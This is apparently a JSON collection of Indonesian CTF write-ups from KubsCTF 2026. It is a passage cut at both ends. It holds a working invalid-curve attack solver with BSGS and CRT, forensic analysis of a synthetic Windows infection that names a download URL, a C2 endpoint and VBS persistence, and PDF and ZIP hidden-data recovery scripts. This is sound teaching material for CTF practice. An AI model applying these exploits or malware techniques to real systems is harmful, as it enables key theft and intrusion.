        "content": "`capy256k1.py` menggunakan kurva Weierstrass pendek:\n\n\\[\nE: y^2 \\equiv x^3 + 7 \\pmod p.\n\\]\n\n`Point.__init__()` langsung menyimpan koordinat tanpa memeriksa apakah titik memenuhi persamaan tersebut. Kemudian `probe(secret, point)` menghitung `secret * point` menggunakan formula perkalian titik biasa.\n\nFormula penjumlahan titik dalam kode hanya bergantung pada `p` dan `a = 0`, **bukan** pada konstanta `b = 7`. Artinya, ketika titik yang diberikan berada di kurva `y² = x³ + b` untuk `b` lain, perkalian skalar tetap sah sebagai operasi grup pada kurva tersebut. Server akhirnya membocorkan perkalian secret pada beberapa grup yang ordonya mudah dieksploitasi.\n\nIni adalah **invalid-curve attack**, bukan kelemahan SHA-256 atau XOR stream.",
        "code": ""
      },
      {
        "title": "1. Identifikasi kurva diagnostik",
        "content": "Baca `output.json`, lalu hitung konstanta untuk setiap titik yang diberikan:\n\n\n\nHasilnya, empat input diagnostik terletak pada kurva berbeda:\n\n| Probe | Nilai `b` | Kurva |\n| --- | --- | --- |\n| 1 | 2 | `y² = x³ + 2` |\n| 2 | 3 | `y² = x³ + 3` |\n| 3 | 4 | `y² = x³ + 4` |\n| 4 | 5 | `y² = x³ + 5` |\n\nPasangan hasil `(rx, ry)` masing-masing juga memenuhi persamaan kurvanya. Jadi untuk setiap probe tersedia persamaan:\n\n\\[\nQ_i = [k]P_i\n\\]\n\ndengan `k` merupakan **secret yang sama**.",
        "code": "b = (y*y - x*x*x) % p"
      },
      {
        "title": "2. Tentukan orde grup dan subgrup",
        "content": "Semua kurva diagnostik mempunyai bentuk `y² = x³ + b` dengan `a = 0` dan `j = 0`. Mereka adalah *sextic twists*. Untuk parameter prima yang digunakan, enam kemungkinan trace Frobenius dapat diperoleh dari orde kurva utama `N` yang sudah tercantum di source:\n\n\\[\nt = p + 1 - N, \\quad t^2 + 3v^2 = 4p.\n\\]\n\nEnam trace yang mungkin:\n\n\\[\n\\left\\{\\pm t,\\ \\pm \\frac{t+3v}{2},\\ \\pm \\frac{t-3v}{2}\\right\\}.\n\\]\n\nUntuk setiap kandidat `n = p+1-trace`, cek `[n]P_i = O`. Nilai yang cocok adalah orde grup kurva tempat titik berada. Faktorkan orde tersebut (misalnya pakai `factorint()`/ECM di Sage), lalu cek faktor kandidat dengan `[r]P_i = O`. Faktor `r` berikut merupakan orde prima titik-titik diagnostik:\n\n| `b` | Orde subgrup `r` |\n| --- | ---: |\n| 2 | `11799928573` |\n| 3 | `90287601949` |\n| 4 | `354690454903` |\n| 5 | `11472381409` |\n\nKeempat orde ini berada di kisaran 31–39 bit. Karena titik-titiknya memiliki orde prima kecil, *discrete log* pada masing-masing subgrup dapat dipecahkan menggunakan Baby-step Giant-step (BSGS), tanpa menyerang discrete log kurva utama yang berukuran 256 bit.",
        "code": ""
      },
      {
        "title": "3. Recover secret modulo setiap orde",
        "content": "Implementasi BSGS dalam `solve.py` membangun tabel baby step `jP`, dengan `0 <= j < ceil(sqrt(r))`. Giant step memeriksa:\n\n\\[\nQ - (i\\cdot m)P = \\pm[j]P.\n\\]\n\nTabel cukup menyimpan koordinat `x`. Karena `x(P) = x(-P)`, solver menguji kedua kandidat `k = im + j` dan `k = im - j`, lalu mengonfirmasi dengan perkalian skalar penuh.\n\nHasil empat discrete log:\n\n\n\nSemua residu diverifikasi dengan `[k]P_i == Q_i`.",
        "code": "k ≡   3679953973 (mod  11799928573)\nk ≡  26161617092 (mod  90287601949)\nk ≡ 223611984189 (mod 354690454903)\nk ≡   8003312562 (mod  11472381409)"
      },
      {
        "title": "4. Gabungkan dengan CRT",
        "content": "Karena seluruh modulus saling koprima, Chinese Remainder Theorem (CRT) menghasilkan secret unik modulo perkalian empat orde:\n\n\n\nModulus gabungan berukuran **142 bit**, sedangkan recovered secret berukuran **128 bit**. Nilai tersebut merupakan representasi secret pada rentang 128-bit.",
        "code": "CRT modulus = 4335214344994540208290939302206705687676079\nRecovered k = 206229994785984600850531915192031064515"
      },
      {
        "title": "5. Decrypt flag",
        "content": "Source menggunakan derivasi key dan stream XOR berikut:\n\n\n\nDari ciphertext di `output.json`:\n\n\n\nDiperoleh:",
        "code": "key = sha256(b\"capy256k1:\" + secret.to_bytes(32, \"big\")).digest()\nstream_block_i = sha256(key + i.to_bytes(4, \"big\")).digest()\nplaintext = ciphertext XOR (stream_block_0 || stream_block_1 || ...)"
      },
      {
        "title": "Reproduksi",
        "content": "Simpan `solve.py` dan file asli `capy256k1.zip` pada direktori yang sama, lalu jalankan:\n\n\n\nSolver hanya memerlukan Python 3 dan standard library. Input juga dapat berupa `output.json` yang diekstrak ke direktori yang sama. Prosesnya menghitung discrete log untuk empat titik, menggabungkan residu dengan CRT, lalu mendekripsi flag. Total operasi didominasi BSGS pada subgrup orde `354690454903` (~600 ribu baby step dan maksimal ~600 ribu giant step).",
        "code": "python3 solve.py"
      },
      {
        "title": "Perbaikan implementasi",
        "content": "Jangan izinkan titik dari luar kurva masuk ke operasi scalar multiplication. Validasi setiap input:\n\n\n\nDalam protokol produksi, lakukan juga validasi subgroup/order dan penanganan titik infinity sesuai kontrak protokol. Menghapus validasi titik agar operasi lebih cepat justru membuka oracle discrete log pada kurva lain.",
        "code": "assert 0 <= x < P and 0 <= y < P\nassert (y*y - x*x*x - 7) % P == 0"
      },
      {
        "title": "Solver Script",
        "content": "Solver script lengkap (`solve.py`) untuk mengotomatisasi eksploitasi:",
        "code": "#!/usr/bin/env python3\n\"\"\"capy256k1: invalid-curve subgroup discrete logs + CRT + XOR decrypt.\n\nRun from a directory containing either capy256k1.zip or output.json:\n    python3 solve.py\n\nOnly the Python standard library is needed.\n\"\"\"\n\nfrom __future__ import annotations\n\nimport hashlib\nimport json\nfrom math import isqrt, prod\nfrom pathlib import Path\nfrom zipfile import ZipFile\n\n# Original constants from capy256k1.py\nP = 57896044618658097711785492504343953979118230518391900345462709972065690059899\nN = 57896044618658097711785492504343953979550547337311152687033934213882653856908\n\n# Prime orders of the supplied invalid-curve diagnostic points, obtained by\n# point counting the j=0 twists and factoring their orders (see Readme.md).\n# Curve equation is y^2 = x^3 + b (mod P); original curve uses b=7.\nSUBGROUP_ORDER = {\n    2: 11799928573,\n    3: 90287601949,\n    4: 354690454903,\n    5: 11472381409,\n}\n\n# Point is represented as (x, y); infinity is None.\n\ndef point_neg(a):\n    return None if a is None else (a[0], (-a[1]) % P)\n\n\ndef point_add(a, b):\n    if a is None:\n        return b\n    if b is None:\n        return a\n\n    x1, y1 = a\n    x2, y2 = b\n    if x1 == x2 and (y1 + y2) % P == 0:\n        return None\n\n    if a == b:\n        if y1 == 0:\n            return None\n        slope = (3 * x1 * x1) * pow(2 * y1, -1, P) % P\n    else:\n        slope = ((y2 - y1) * pow((x2 - x1) % P, -1, P)) % P\n\n    x3 = (slope * slope - x1 - x2) % P\n    return (x3, (slope * (x1 - x3) - y1) % P)\n\n\ndef scalar_mul(a, k):\n    if k < 0:\n        return scalar_mul(point_neg(a), -k)\n    r = None\n    while k:\n        if k & 1:\n            r = point_add(r, a)\n        a = point_add(a, a)\n        k >>= 1\n    return r\n\n\ndef discrete_log_bsgs(g, h, order):\n    \"\"\"Recover d with h = d*g for a point of known small prime order.\n\n    Store baby steps by x coordinate only; x(P) = x(-P), so test both\n    signs for each collision. This reduces memory without losing solutions.\n    \"\"\"\n    m = isqrt(order) + 1\n    baby = {}\n    current = None\n    for j in range(m):\n        baby[current[0] if current is not None else None] = j\n        current = point_add(current, g)\n\n    stride = point_neg(scalar_mul(g, m))\n    current = h\n    for i in range(m + 1):\n        x = current[0] if current is not None else None\n        if x in baby:\n            j = baby[x]\n            for candidate in ((i * m + j) % order, (i * m - j) % order):\n                if scalar_mul(g, candidate) == h:\n                    return candidate\n        current = point_add(current, stride)\n\n    raise RuntimeError(f\"Discrete log could not be recovered (order {order})\")\n\n\ndef read_output():\n    folder = Path(__file__).resolve().parent\n    for path in (folder / 'output.json', folder / 'capy256k1' / 'output.json'):\n        if path.is_file():\n            return json.loads(path.read_text(encoding='utf-8'))\n    archive = folder / 'capy256k1.zip'\n    if archive.is_file():\n        with ZipFile(archive) as zf:\n            return json.loads(zf.read('capy256k1/output.json'))\n    raise FileNotFoundError('Place output.json or capy256k1.zip beside solve.py')\n\n\ndef candidate_group_orders():\n    \"\"\"j=0 CM: possible traces of the six sextic twists over F_p.\"\"\"\n    t = P + 1 - N\n    numerator = 4 * P - t * t\n    assert numerator % 3 == 0\n    v = isqrt(numerator // 3)\n    assert t * t + 3 * v * v == 4 * P\n    traces = {t, -t, (t + 3 * v) // 2, -(t + 3 * v) // 2,\n              (t - 3 * v) // 2, -(t - 3 * v) // 2}\n    return [P + 1 - trace for trace in traces]\n\n\ndef crt(residues, moduli):\n    modulus = prod(moduli)\n    assert all(modulus % m == 0 for m in moduli)\n    total = 0\n    for a, m in zip(residues, moduli):\n        part = modulus // m\n        total += a * part * pow(part, -1, m)\n    result = total % modulus\n    assert all(result % m == a for a, m in zip(residues, moduli))\n    return result, modulus\n\n\ndef decrypt(secret, ciphertext):\n    key = hashlib.sha256(b'capy256k1:' + secret.to_bytes(32, 'big')).digest()\n    data = bytes.fromhex(ciphertext)\n    stream = b''.join(\n        hashlib.sha256(key + i.to_bytes(4, 'big')).digest()\n        for i in range((len(data) + 31) // 32)\n    )\n    return bytes(a ^ b for a, b in zip(data, stream)).decode('utf-8')\n\n\ndef main():\n    output = read_output()\n    group_orders = candidate_group_orders()\n    residues, moduli = [], []\n\n    for idx, diag in enumerate(output['diagnostics']):\n        g = (diag['x'], diag['y'])\n        h = (diag['rx'], diag['ry'])\n        b = (g[1] ** 2 - g[0] ** 3) % P\n        assert (h[1] ** 2 - h[0] ** 3) % P == b\n        assert b in SUBGROUP_ORDER, f'Unknown off-curve parameter b={b}'\n\n        orders = [n for n in group_orders if scalar_mul(g, n) is None]\n        assert len(orders) == 1, 'Could not identify the twist group order'\n        r = SUBGROUP_ORDER[b]\n        assert orders[0] % r == 0\n        assert scalar_mul(g, r) is None\n        assert scalar_mul(h, r) is None\n\n        d = discrete_log_bsgs(g, h, r)\n        assert scalar_mul(g, d) == h\n        "
      }
    ],
    "terminalOutputs": [],
    "flag": "KubSTU{1t_l00k3d_str41ght_1n_d3v}",
    "lessonsLearned": ""
  },
  {
    "id": "kubsctf2026-foren-baby",
    "title": "baby",
    "category": "Forensics",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-13",
    "author": "Nattt",
    "ctfName": "KubsCTF 2026",
    "tags": [
      "foren",
      "kubsuctf",
      "2026"
    ],
    "description": "Artefak challenge berupa `workstation23.zip`, bukan image disk mentah. Isinya adalah kumpulan artefak Windows sintetis: Chrome History, file Downloads, PowerShell history, Prefetch, Startup folder, state file, dan Recycle Bin.",
    "problemDescription": "File yang paling relevan adalah `InvoiceViewer.exe`, `agent_state.dat`, `RuntimeBroker.exe`, dan `OneDriveUpdate.vbs`.\n\nChrome History menunjukkan user membuka portal invoice lalu mengunjungi URL download:",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Recon",
        "content": "Artefak challenge berupa `workstation23.zip`, bukan image disk mentah. Isinya adalah kumpulan artefak Windows sintetis: Chrome History, file Downloads, PowerShell history, Prefetch, Startup folder, state file, dan Recycle Bin.\n\n\n\nFile yang paling relevan adalah `InvoiceViewer.exe`, `agent_state.dat`, `RuntimeBroker.exe`, dan `OneDriveUpdate.vbs`.",
        "code": "unzip -l workstation23.zip\nunzip -q workstation23.zip -d extracted\nfind extracted -type f -print0 | xargs -0 file"
      },
      {
        "title": "Download dan eksekusi",
        "content": "Chrome History menunjukkan user membuka portal invoice lalu mengunjungi URL download:\n\n\n\nIsi `Users/Alex/Downloads/InvoiceViewer.exe` juga mencatat source yang sama. Prefetch dan PowerShell history menguatkan bahwa file tersebut dijalankan:\n\n\n\n`ZoomInstaller.exe` adalah artefak lama (10 Juni), sehingga bukan file yang terkait dengan chain ini.",
        "code": "https://supplier-portal.example/invoices\nhttp://198.51.100.23:8080/InvoiceViewer.exe"
      },
      {
        "title": "C2",
        "content": "`ProgramData/.cache/agent_state.dat` berisi konfigurasi koneksi:\n\n```ini\n[sync]\nprofile=onedrive-update\ntransport=tcp\nendpoint=198.51.100.23:4444\nlast_status=connected\n```\n\nPort `8080` adalah server download, sedangkan endpoint C2 yang tercatat adalah `198.51.100.23:4444`.",
        "code": ""
      },
      {
        "title": "Persistence",
        "content": "Setelah InvoiceViewer dijalankan, muncul `RuntimeBroker.exe` di lokasi user yang tidak sah:\n\n\n\nLokasi legitimate-nya adalah `C:\\Windows\\System32\\RuntimeBroker.exe`. File `OneDriveUpdate.vbs` berada di Startup directory dan mencatat target tersebut. Recycle Bin kemudian menyimpan metadata bahwa file itu dihapus dari path yang sama. Jadi implementasi persistence yang diminta adalah `OneDriveUpdate.vbs`; `RuntimeBroker.exe` adalah payload bermasker yang menjadi target script.",
        "code": "C:\\Users\\Alex\\AppData\\Roaming\\Microsoft\\OneDrive\\RuntimeBroker.exe"
      }
    ],
    "terminalOutputs": [],
    "flag": "KubSTU{InvoiceViewer.exe|198.51.100.23:4444|OneDriveUpdate.vbs}",
    "lessonsLearned": ""
  },
  {
    "id": "kubsctf2026-foren-echoesoftheplc",
    "title": "Echoes of the PLC",
    "category": "Forensics",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-13",
    "author": "Nattt",
    "ctfName": "KubsCTF 2026",
    "tags": [
      "foren",
      "kubsuctf",
      "2026"
    ],
    "description": "Artefak challenge hanya satu file PCAP:",
    "problemDescription": "Traffic-nya memang campuran: syslog, CoAP, NTP, DHCP, MQTT, HTTP, TFTP, Modbus/TCP, ICMP, dan satu kanal UDP/9001 dengan header `BKP3`. String flag tidak muncul langsung.\n\nPesan MQTT pada topic `facility/maintenance/calibration-manifest` berisi hex-encoded manifest. Setelah di-decode:",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Recon",
        "content": "Artefak challenge hanya satu file PCAP:\n\n\n\nTraffic-nya memang campuran: syslog, CoAP, NTP, DHCP, MQTT, HTTP, TFTP, Modbus/TCP, ICMP, dan satu kanal UDP/9001 dengan header `BKP3`. String flag tidak muncul langsung.",
        "code": "file echoes_of_the_plc.pcap\ntshark -r echoes_of_the_plc.pcap -q -z io,phs"
      },
      {
        "title": "Temuan yang mengubah arah",
        "content": "Pesan MQTT pada topic `facility/maintenance/calibration-manifest` berisi hex-encoded manifest. Setelah di-decode:\n\n```json\n{\n  \"source\": \"Modbus/TCP unit=7 function=0x04\",\n  \"order\": \"transaction_id ascending\",\n  \"mask\": \"ICMP Echo Reply id=3199; sequence = transaction_id - 0x4000\",\n  \"final\": \"zlib\"\n}\n```\n\nJadi payload tidak dicari sebagai string biasa. Response Modbus dengan unit 7 dan function 4 harus diambil, diurutkan berdasarkan transaction ID, lalu di-XOR dengan payload ICMP Echo Reply yang sequence-nya sesuai aturan manifest.",
        "code": ""
      },
      {
        "title": "Ekstraksi dan decoding",
        "content": "Response Modbus yang relevan memiliki transaction ID `0x4001` sampai `0x4009`, masing-masing membawa 17 byte. Payload ICMP yang dipakai juga berjumlah sembilan, dengan identifier `3199` dan sequence `1` sampai `9`.\n\nContoh decoding manual dengan data yang diekstrak dari tshark:\n\n\n\nOffset 9 melewati MBAP header, unit ID, function code, dan byte-count, sehingga yang di-XOR hanya data register Modbus.\n\nHasil dekompresi:",
        "code": "import zlib\n\nicmp = {\n    1: \"9886522b14e297a141b2a095d25fac671c\",\n    2: \"ed05b863c91da03cab1504329ac2cdd988\",\n    3: \"ee69601adb5cb39107522841d25cf851da\",\n    4: \"beecfa25515df9ccb84335612dcc8192d8\",\n    5: \"2d05abc332af7f2ede12b42847aa0ee93b\",\n    6: \"d9233768ba929f4177b7e004267616dfb5\",\n    7: \"48fa7169bcd39c402eaccf16d09a19a208\",\n    8: \"8c08518b0036818cbf05b9af2a6608204c\",\n    9: \"03\",\n}\n\n# rows berisi (transaction_id, full Modbus/TCP response payload)\ncipher = b\"\".join(\n    bytes(a ^ b for a, b in zip(payload[9:], bytes.fromhex(icmp[tx - 0x4000])))\n    for tx, payload in sorted(rows)\n)\n\nprint(zlib.decompress(cipher).decode())"
      }
    ],
    "terminalOutputs": [],
    "flag": "KubSTU{modbus_echoes_keep_the_secret}",
    "lessonsLearned": ""
  },
  {
    "id": "kubsctf2026-foren-lastchance",
    "title": "Last Chance — Forensics CTF Writeup",
    "category": "Forensics",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-13",
    "author": "Nattt",
    "ctfName": "KubsCTF 2026",
    "tags": [
      "foren",
      "kubsuctf",
      "2026"
    ],
    "description": "PDF tampak seperti dokumen biasa dengan cerita \"The Legend of the Silver Woods\". Konten cerita bukan flag. Data sebenarnya terbagi menjadi dua PNG pada metadata PDF dan tiga objek PDF yang sengaja ditambahkan setelah `%%EOF`. QR yang direkonstruksi menghasilkan salt. Objek pseudo-JBIG2 memberikan IV. Objek pseudo-signature berisi petunjuk plaintext. Objek `/Crypt` memuat ciphertext AES-256-CBC.",
    "problemDescription": "**Flag:** `KubSTU{part1_f4k3_s1g_metadata_stitching_is_fun_abe8776b}`\n\n- `challenge.pdf` — salinan lokal dari attachment `last chance.pdf` (PDF 1.3, 1 halaman, 4481 byte).\n- `solve.py` — reproduksi ekstraksi metadata, pembacaan appended object, dan dekripsi flag.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Ringkasan",
        "content": "PDF tampak seperti dokumen biasa dengan cerita \"The Legend of the Silver Woods\". Konten cerita bukan flag. Data sebenarnya terbagi menjadi dua PNG pada metadata PDF dan tiga objek PDF yang sengaja ditambahkan setelah `%%EOF`. QR yang direkonstruksi menghasilkan salt. Objek pseudo-JBIG2 memberikan IV. Objek pseudo-signature berisi petunjuk plaintext. Objek `/Crypt` memuat ciphertext AES-256-CBC.\n\n**Flag:** `KubSTU{part1_f4k3_s1g_metadata_stitching_is_fun_abe8776b}`",
        "code": ""
      },
      {
        "title": "File Challenge",
        "content": "- `challenge.pdf` — salinan lokal dari attachment `last chance.pdf` (PDF 1.3, 1 halaman, 4481 byte).\n- `solve.py` — reproduksi ekstraksi metadata, pembacaan appended object, dan dekripsi flag.",
        "code": ""
      },
      {
        "title": "Analisis Awal",
        "content": "`pdfinfo` menunjukkan metadata yang tak normal:\n\n- `/Title`: `Project Aether - Security Protocol`\n- `/Author`: `QR_PART1:<base64 PNG>`\n- `/Subject`: `QR_PART2:<base64 PNG>`\n\nBagian teks hanya berisi cerita dan footer \"This document has been digitally signed and verified.\" Klaim footer **bukan bukti** keabsahan tanda tangan digital.",
        "code": "file challenge.pdf\npdfinfo challenge.pdf\npdftotext -layout challenge.pdf -\nstrings -a challenge.pdf"
      },
      {
        "title": "Analisis Static dan Hidden Data",
        "content": "",
        "code": ""
      },
      {
        "title": "1. Memulihkan QR dari metadata",
        "content": "Decode Base64 `/Author` dan `/Subject` menjadi dua gambar PNG RGB dengan ukuran masing-masing **145×72** dan **145×73**. Susun secara vertikal (`Author` di atas, `Subject` di bawah) untuk membentuk QR **145×145**.\n\n![Reconstructed QR](/assets/writeups/kubsctf_2026/foren-lastchance/qr_joined.png) Hasil scan QR:\n\n\n\nDalam solver, data PNG dibaca lewat Pillow dan dideteksi dengan OpenCV, semuanya offline.",
        "code": "salt=7f3c92a1b4e5"
      },
      {
        "title": "2. Menemukan objek di belakang EOF",
        "content": "PDF standar berhenti setelah `startxref ... %%EOF` dan cross-reference aslinya hanya mendaftarkan objek `1` hingga `9`. Namun, pemeriksaan byte mentah menunjukkan tiga definisi objek berikut **setelah** penutup PDF:\n\n- `100 0 obj` — dicitrakan sebagai `/Filter /JBIG2Decode` dengan metadata buatan, berisi teks hex ASCII.\n- `101 0 obj` — dicitrakan sebagai `/Type /Sig`, `/SubFilter /adbe.pkcs7.detached`, tetapi isinya adalah signature tiruan.\n- `102 0 obj` — dicitrakan sebagai `/Filter /Crypt`, menyimpan ciphertext ASCII-hex.\n\nObjek-objek tambahan ini **tidak tercatat dalam xref**. Karena itu, ekstraksi normal berbasis parser PDF bisa melewatkannya.",
        "code": ""
      },
      {
        "title": "3. Objek 100 — material IV",
        "content": "Stream literalnya:\n\n\n\nSetelah decode hex, bagian setelah marker `ff 05 02 00 10` adalah **16 byte ASCII**:\n\n\n\nIni dipakai sebagai IV AES-CBC, sebagai **ASCII**, bukan hasil `bytes.fromhex` atas karakternya.",
        "code": "ff0400000000ff0502001061316232633364346535663637383930ff0300000001"
      },
      {
        "title": "4. Objek 101 — signature palsu",
        "content": "Bagian `/Contents <...>` berisi ASN.1-looking blob dengan string berulang `INTERNAL_SIGNATURE_BLOB` dan marker:\n\n\n\nMarker tersebut muncul pada flag yang berhasil didekripsi. Struktur dan `/ByteRange` tidak mendukung klaim bahwa ini tanda tangan PDF terverifikasi.",
        "code": "part1_f4k3_s1g"
      },
      {
        "title": "5. Objek 102 — ciphertext",
        "content": "Stream hex ASCII:\n\n\n\nDecode hex menghasilkan 64 byte data biner (empat blok AES).",
        "code": "6dc6ddd1cd59938a80e558d4cf17836132bf8109da717629e531ba4c0d426dd5a4b429b951a830312898d113bfe01ee11ea61beb57d58ff8bdb7986683f7e230"
      },
      {
        "title": "Algoritma Dekripsi",
        "content": "Kunci AES-256 diperoleh dengan SHA-256 terhadap gabungan **salt ASCII QR**, lalu **IV ASCII dari objek 100**, dalam urutan tersebut:\n\n\n\nKey yang dihasilkan:\n\n\n\nDekripsi AES-256-CBC memberikan:\n\n\n\nTujuh byte `0x07` di akhir merupakan padding PKCS#7 yang valid. Setelah dihapus, plaintext berbentuk flag yang diminta. Marker `part1_f4k3_s1g` dari objek 101 juga cocok dengan bagian plaintext.",
        "code": "salt = b'7f3c92a1b4e5'\niv = b'a1b2c3d4e5f67890'\nkey = hashlib.sha256(salt + iv).digest()"
      },
      {
        "title": "Penyusunan Solve Script",
        "content": "Instal dependensi jika belum tersedia di virtual environment:\n\n\n\nJalankan dari direktori yang memuat PDF dan solver:\n\n\n\n`solve.py` tidak menanam flag secara hardcoded: ia mengidentifikasi potongan QR, menggabungkannya, membaca marker pada objek 100–102, menghitung kunci, mendekripsi, memvalidasi padding PKCS#7, memvalidasi pola `KubSTU{...}`, dan mencocokkan marker signature dengan plaintext.",
        "code": "python3 -m pip install pillow numpy opencv-python-headless cryptography"
      },
      {
        "title": "Solver Script",
        "content": "Solver script lengkap (`solve.py`) untuk mengotomatisasi eksploitasi:",
        "code": "#!/usr/bin/env python3\n\"\"\"Last Chance — offline PDF forensic CTF solver.\n\nRequires: pillow, numpy, opencv-python-headless (or opencv-python), cryptography.\nRun: python3 solve.py challenge.pdf\n\"\"\"\n\nimport base64\nimport hashlib\nimport io\nimport re\nimport sys\nfrom pathlib import Path\n\nimport cv2\nimport numpy as np\nfrom PIL import Image\nfrom cryptography.hazmat.primitives import padding\nfrom cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\n\n\ndef pdf_object(data: bytes, n: int) -> bytes:\n    # Objects 100, 101 and 102 were appended *after* %%EOF, so standard PDF\n    # readers do not expose them via the PDF cross-reference table.\n    match = re.search(rb'(?m)^' + str(n).encode() + rb' 0 obj\\s*(.*?)\\s*endobj', data, re.S)\n    if not match:\n        raise ValueError(f'PDF object {n} not found')\n    return match.group(1)\n\n\ndef stream_from_object(obj: bytes) -> bytes:\n    match = re.search(rb'\\bstream\\s*\\r?\\n(.*?)\\r?\\nendstream', obj, re.S)\n    if not match:\n        raise ValueError('No stream within PDF object')\n    return match.group(1)\n\n\ndef extract_qr_salt(data: bytes) -> bytes:\n    images = []\n    for field, expected_tag in ((b'Author', b'QR_PART1'), (b'Subject', b'QR_PART2')):\n        match = re.search(rb'/' + field + rb'\\s*\\(' + expected_tag + rb':([A-Za-z0-9+/=]+)\\)', data)\n        if not match:\n            raise ValueError(f'Cannot locate {field.decode()} QR fragment')\n        img = Image.open(io.BytesIO(base64.b64decode(match.group(1)))).convert('RGB')\n        images.append(img)\n\n    if images[0].width != images[1].width:\n        raise ValueError('QR fragments have incompatible widths')\n\n    joined = Image.new('RGB', (images[0].width, sum(x.height for x in images)), 'white')\n    joined.paste(images[0], (0, 0))\n    joined.paste(images[1], (0, images[0].height))\n    qr_text, corners, _ = cv2.QRCodeDetector().detectAndDecode(np.array(joined))\n    if corners is None or not re.fullmatch(r'salt=([0-9a-fA-F]+)', qr_text):\n        raise ValueError(f'QR does not contain the expected salt: {qr_text!r}')\n    return qr_text.split('=', 1)[1].encode('ascii')\n\n\ndef extract_iv_from_fake_jbig2(data: bytes) -> bytes:\n    # The stream is ASCII hex *pretending* to be JBIG2 bytes. Decoding reveals\n    # a custom marker FF 05 02 00 10 followed by exactly 16 ASCII bytes.\n    wrapped = stream_from_object(pdf_object(data, 100)).strip()\n    decoded = bytes.fromhex(wrapped.decode('ascii'))\n    marker = bytes.fromhex('ff05020010')\n    offset = decoded.find(marker)\n    if offset < 0:\n        raise ValueError('JBIG2-like custom marker missing')\n    iv = decoded[offset + len(marker): offset + len(marker) + 16]\n    if not re.fullmatch(rb'[0-9a-f]{16}', iv):\n        raise ValueError(f'Unexpected IV from fake JBIG2 stream: {iv!r}')\n    return iv\n\n\ndef extract_signature_hint(data: bytes) -> bytes:\n    # Not a real/verifiable PDF signature; a dummy PKCS#7-looking blob.\n    match = re.search(rb'/Contents\\s*<([0-9A-Fa-f]+)>', pdf_object(data, 101))\n    if not match:\n        raise ValueError('Fake signature content missing')\n    sig = bytes.fromhex(match.group(1).decode('ascii'))\n    match = re.search(rb'part\\d+_[0-9a-z_]+', sig)\n    if not match:\n        raise ValueError('Signature hint missing')\n    return match.group(0)\n\n\ndef extract_ciphertext(data: bytes) -> bytes:\n    enc = stream_from_object(pdf_object(data, 102)).strip()\n    ct = bytes.fromhex(enc.decode('ascii'))\n    if len(ct) % 16:\n        raise ValueError('Ciphertext is not AES block aligned')\n    return ct\n\n\ndef main() -> None:\n    path = Path(sys.argv[1]) if len(sys.argv) > 1 else Path('challenge.pdf')\n    raw = path.read_bytes()\n    salt = extract_qr_salt(raw)\n    iv = extract_iv_from_fake_jbig2(raw)\n    hint = extract_signature_hint(raw)\n    ciphertext = extract_ciphertext(raw)\n\n    key = hashlib.sha256(salt + iv).digest()  # ASCII salt and 16-byte ASCII IV\n    decryptor = Cipher(algorithms.AES(key), modes.CBC(iv)).decryptor()\n    padded = decryptor.update(ciphertext) + decryptor.finalize()\n    unpadder = padding.PKCS7(128).unpadder()\n    plaintext = unpadder.update(padded) + unpadder.finalize()\n\n    if not re.fullmatch(rb'KubSTU\\{[A-Za-z0-9_]+\\}', plaintext):\n        raise ValueError('AES plaintext is not a valid flag')\n    if hint not in plaintext:\n        raise ValueError('Fake-signature hint does not match decrypted plaintext')\n\n    print('QR salt:       ', salt.decode())\n    print('JBIG2 IV:      ', iv.decode())\n    print('Signature hint:', hint.decode())\n    print('AES-256 key:   ', key.hex())\n    print('Encrypted size:', len(ciphertext))\n    print('<FLAG>' + plaintext.decode('ascii') + '</FLAG>')\n\n\nif __name__ == '__main__':\n    main()\n"
      }
    ],
    "terminalOutputs": [],
    "flag": "KubSTU{part1_f4k3_s1g_metadata_stitching_is_fun_abe8776b}",
    "lessonsLearned": ""
  },
  {
    "id": "kubsctf2026-foren-nottogivenottotake",
    "title": "Not to give, not to take",
    "category": "Forensics",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-13",
    "author": "Nattt",
    "ctfName": "KubsCTF 2026",
    "tags": [
      "foren",
      "kubsuctf",
      "2026"
    ],
    "description": "Kategori: forensics  \nArtefak: `Not to give, not to take.zip`",
    "problemDescription": "`file` mengenali arsip sebagai ZIP, tetapi `unzip` dan `zipinfo` sama-sama gagal karena end-of-central-directory tidak ada. `7z` masih bisa melihat entry yang berasal dari local header:\n\nUkuran arsip hanya 767 byte dan hex dump menunjukkan enam signature local header `PK\\x03\\x04` berurutan. Jadi central directory memang terpotong, tetapi data entry masih ada.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Recon",
        "content": "`file` mengenali arsip sebagai ZIP, tetapi `unzip` dan `zipinfo` sama-sama gagal karena end-of-central-directory tidak ada. `7z` masih bisa melihat entry yang berasal dari local header:\n\n\n\nUkuran arsip hanya 767 byte dan hex dump menunjukkan enam signature local header `PK\\x03\\x04` berurutan. Jadi central directory memang terpotong, tetapi data entry masih ada.",
        "code": "case_notes.txt\nsecret.txt\ncaf�.txt\nevidence_03.bin\ncalibration.dat\nfragment_06.dat"
      },
      {
        "title": "Recovery",
        "content": "Saya membaca local header secara berurutan. Untuk entry biasa, ukuran compressed dari header cukup untuk menentukan batas payload. `secret.txt` memakai bit 3, sehingga ukurannya ada di data descriptor `PK\\x07\\x08` setelah raw DEFLATE stream. Nama `caf\\x82.txt` juga perlu didecode sebagai CP437, menjadi `café.txt`.\n\nAda dua jebakan yang mengubah arah analisis:\n\n- `calibration.dat` mengandung bytes `PK\\x03\\x04` di dalam payload, tetapi ukuran pada local header menunjukkan bahwa itu hanya data biasa bernama `ghost.bin`, bukan entry baru.\n- `evidence_03.bin` punya ukuran yang benar tetapi CRC mismatch, sehingga file tersebut harus dipertahankan sebagai artefak rusak dan tidak dijadikan sumber flag.\n\nEntry terakhir berhasil didecompress sampai tepat EOF. CRC cocok untuk `case_notes.txt`, `secret.txt`, `café.txt`, `calibration.dat`, dan `fragment_06.dat`; pencarian flag pada semua hasil recovery menghasilkan satu kandidat unik dari `secret.txt`.",
        "code": ""
      },
      {
        "title": "Script",
        "content": "Script berikut melakukan recovery tanpa membutuhkan central directory dan menyimpan payload ke folder `recovered/`.\n\n\n\nOutput penting:",
